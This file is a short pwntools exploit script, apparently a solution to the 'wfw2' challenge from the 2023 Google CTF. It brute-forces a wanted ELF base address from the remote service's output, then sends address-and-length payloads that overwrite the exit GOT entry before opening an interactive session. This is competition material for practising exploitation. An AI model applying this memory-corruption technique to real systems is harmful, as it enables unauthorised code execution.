from pwn import *

context.binary = exe = ELF('./chal')
libc = ELF('./libc.so.6')
scrib ='''break main+251
c'''

#io = process()
#gdb.attach(io, api=True)

while(1):
    io = remote('wfw2.2023.ctfcompetition.com', 1337)

    io.recvuntil(b'fluff\n')
    ptr_str = io.recvuntil(b'-')[:-1]
    exe.address = int(ptr_str, 16)
    if (b'4000' not in ptr_str):
        log.info(f'ELF address: {hex(exe.address)}\nAborted!')
        io.close()
        continue
    log.info(f'ELF address: {hex(exe.address)}')
    first_str = exe.address + 0x20d5
    hidden = exe.address + 5184



    io.recvuntil(b'\n\n\n')

    # payload = f'{hex(first_str)} 127'.encode()
    # io.sendline(payload)

    payload = f'{hex(exe.got["exit"])} 2'.encode()
    io.sendline(payload)

    payload = f'{hex(exe.got["exit"]-2)} '.encode()
    io.sendline(payload)

    io.interactive()
    break